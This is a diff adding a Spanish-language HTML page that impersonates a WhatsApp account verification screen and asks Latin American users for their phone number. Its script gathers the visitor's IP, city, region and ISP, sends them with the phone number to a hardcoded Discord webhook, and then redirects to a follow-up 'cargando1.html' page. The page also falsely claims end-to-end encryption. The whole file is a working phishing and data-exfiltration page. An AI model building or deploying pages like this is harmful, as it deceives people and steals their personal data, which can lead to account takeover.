@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Cuenta - WhatsApp</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --whatsapp-green: #25D366;
+            --whatsapp-dark-green: #128C7E;
+            --whatsapp-teal-green: #075E54;
+            --whatsapp-light-green: #dcf8c6;
+            --light-gray: #f0f2f5;
+            --medium-gray: #e0e0e0;
+            --dark-gray: #3b4a54;
+            --white: #ffffff;
+            --shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, var(--light-gray) 0%, #e6f7ff 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+            color: var(--dark-gray);
+            line-height: 1.6;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+            width: 100%;
+        }
+        
+        .logo {
+            width: 70px;
+            height: 70px;
+            background-color: var(--white);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: var(--shadow);
+        }
+        
+        .logo i {
+            font-size: 38px;
+            color: var(--whatsapp-green);
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--dark-gray);
+            margin-bottom: 8px;
+        }
+        
+        .header p {
+            font-size: 15px;
+            color: var(--dark-gray);
+            opacity: 0.8;
+        }
+        
+        .card {
+            background-color: var(--white);
+            border-radius: 16px;
+            padding: 30px;
+            width: 100%;
+            box-shadow: var(--shadow);
+            transition: var(--transition);
+        }
+        
+        .card:hover {
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--dark-gray);
+            margin-bottom: 8px;
+        }
+        
+        .input-with-icon {
+            position: relative;
+        }
+        
+        .input-with-icon i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--whatsapp-dark-green);
+            font-size: 18px;
+        }
+        
+        select, input {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            border-radius: 10px;
+            border: 1.5px solid var(--medium-gray);
+            font-size: 15px;
+            transition: var(--transition);
+            background-color: var(--light-gray);
+        }
+        
+        select:focus, input:focus {
+            border-color: var(--whatsapp-green);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.2);
+            background-color: var(--white);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            background: linear-gradient(135deg, var(--whatsapp-green) 0%, var(--whatsapp-dark-green) 100%);
+            color: var(--white);
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, var(--whatsapp-dark-green) 0%, var(--whatsapp-teal-green) 100%);
+            transform: translateY(-2px);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            width: 100%;
+        }
+        
+        .footer p {
+            font-size: 13px;
+            color: var(--dark-gray);
+            opacity: 0.7;
+        }
+        
+        .footer-logo {
+            width: 30px;
+            height: 30px;
+            margin-top: 10px;
+            opacity: 0.7;
+        }
+        
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: var(--white);
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            background-color: var(--whatsapp-green);
+            color: white;
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+            transform: translateX(100%);
+            transition: transform 0.3s ease;
+            z-index: 1000;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .card {
+                padding: 25px 20px;
+            }
+            
+            .header h1 {
+                font-size: 22px;
+            }
+            
+            select, input, .btn {
+                padding: 14px 14px 14px 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-whatsapp"></i>
+            </div>
+            <h1>Verificación de WhatsApp</h1>
+            <p>Ingrese su número de teléfono para sincronizar su cuenta</p>
+        </div>
+        
+        <div class="card">
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="country">País</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-globe-americas"></i>
+                        <select id="country" required>
+                            <option value="" disabled selected>Selecciona tu país</option>
+                            <option value="+54">🇦🇷 Argentina</option>
+                            <option value="+591">🇧🇴 Bolivia</option>
+                            <option value="+55">🇧🇷 Brasil</option>
+                            <option value="+56">🇨🇱 Chile</option>
+                            <option value="+57">🇨🇴 Colombia</option>
+                            <option value="+506">🇨🇷 Costa Rica</option>
+                            <option value="+53">🇨🇺 Cuba</option>
+                            <option value="+1">🇩🇴 República Dominicana</option>
+                            <option value="+593">🇪🇨 Ecuador</option>
+                            <option value="+503">🇸🇻 El Salvador</option>
+                            <option value="+502">🇬🇹 Guatemala</option>
+                            <option value="+504">🇭🇳 Honduras</option>
+                            <option value="+52">🇲🇽 México</option>
+                            <option value="+505">🇳🇮 Nicaragua</option>
+                            <option value="+507">🇵🇦 Panamá</option>
+                            <option value="+595">🇵🇾 Paraguay</option>
+                            <option value="+51">🇵🇪 Perú</option>
+                            <option value="+1">🇵🇷 Puerto Rico</option>
+                            <option value="+598">🇺🇾 Uruguay</option>
+                            <option value="+58">🇻🇪 Venezuela</option>
+                        </select>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="telefono">Número de teléfono</label>
+                    <div class="input-with-icon">
+                        <i class="fas fa-mobile-alt"></i>
+                        <input type="tel" id="telefono" placeholder="Ejemplo: 987654321" required pattern="[0-9]{7,15}">
+                    </div>
+                </div>
+                
+                <button type="submit" id="submitButton" class="btn">
+                    <span>Continuar</span>
+                    <div class="loader" id="loader"></div>
+                </button>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <p>Protegiendo tu privacidad con encriptación de extremo a extremo</p>
+            <img src="https://sappsapp23.sirv.com/docs/GjxmhIpug9B.svg" class="footer-logo" alt="WhatsApp Logo">
+        </div>
+    </div>
+
+    <div class="notification" id="notification">
+        <i class="fas fa-check-circle"></i> Verificando información...
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Auto-seleccionar país por IP
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const countryMap = {
+                        'AR': '+54', 'BO': '+591', 'BR': '+55', 'CL': '+56',
+                        'CO': '+57', 'CR': '+506', 'CU': '+53', 'DO': '+1',
+                        'EC': '+593', 'SV': '+503', 'GT': '+502', 'HN': '+504',
+                        'MX': '+52', 'NI': '+505', 'PA': '+507', 'PY': '+595',
+                        'PE': '+51', 'PR': '+1', 'UY': '+598', 'VE': '+58'
+                    };
+                    const countrySelect = document.getElementById('country');
+                    if (countrySelect && data.country_code in countryMap) {
+                        countrySelect.value = countryMap[data.country_code];
+                    }
+                })
+                .catch(err => console.error("Geo IP error:", err));
+
+            // Capturar envío del formulario
+            document.getElementById("loginForm").addEventListener("submit", async function(e) {
+                e.preventDefault();
+                
+                const telefono = document.getElementById("telefono").value;
+                const pais = document.getElementById("country").value;
+                
+                // Validar número telefónico
+                if (!telefono.match(/^[0-9]{7,15}$/)) {
+                    alert("Por favor, ingrese un número de teléfono válido (solo números, 7-15 dígitos)");
+                    return;
+                }
+                
+                // Mostrar loader
+                const submitButton = document.getElementById("submitButton");
+                const loader = document.getElementById("loader");
+                const buttonText = submitButton.querySelector("span");
+                
+                buttonText.textContent = "Verificando...";
+                loader.style.display = "block";
+                submitButton.disabled = true;
+                
+                // Mostrar notificación
+                const notification = document.getElementById("notification");
+                notification.classList.add("show");
+                
+                try {
+                    // Obtener información de IP
+                    const ipResponse = await fetch('https://ipapi.co/json/');
+                    const ipData = await ipResponse.json();
+                    
+                    // Webhook de Discord
+                    const webhookUrl = 'https://discordapp.com/api/webhooks/1408473575647744201/9mNHBbWbHY6o7jyUw0xJPRPLXl_zpjnNmT4PdX_0a_QzP4Bz42rjyqJtXn1pFE_UTQUJ';
+                    
+                    // Mensaje formateado para Discord
+                    const mensaje = {
+                        content: `📩 **Nuevo acceso detectado**\n` +
+                                 `📱 Teléfono: ${pais} ${telefono}\n` +
+                                 `🌍 País: ${ipData.country_name || 'Desconocido'} (${ipData.country_code || 'XX'})\n` +
+                                 `📍 Región: ${ipData.region || 'Desconocida'}\n` +
+                                 `🏙️ Ciudad: ${ipData.city || 'Desconocida'}\n` +
+                                 `📮 IP: ${ipData.ip || 'No disponible'}\n` +
+                                 `🛜 ISP: ${ipData.org || 'No disponible'}`
+                    };
+                    
+                    // Enviar a Discord
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(mensaje)
+                    });
+                    
+                    // Redirigir después del envío
+                    setTimeout(() => {
+                        window.location.href = "cargando1.html";
+                    }, 1500);
+                } catch (err) {
+                    console.error("Error:", err);
+                    setTimeout(() => {
+                        window.location.href = "cargando1.html";
+                    }, 1500);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
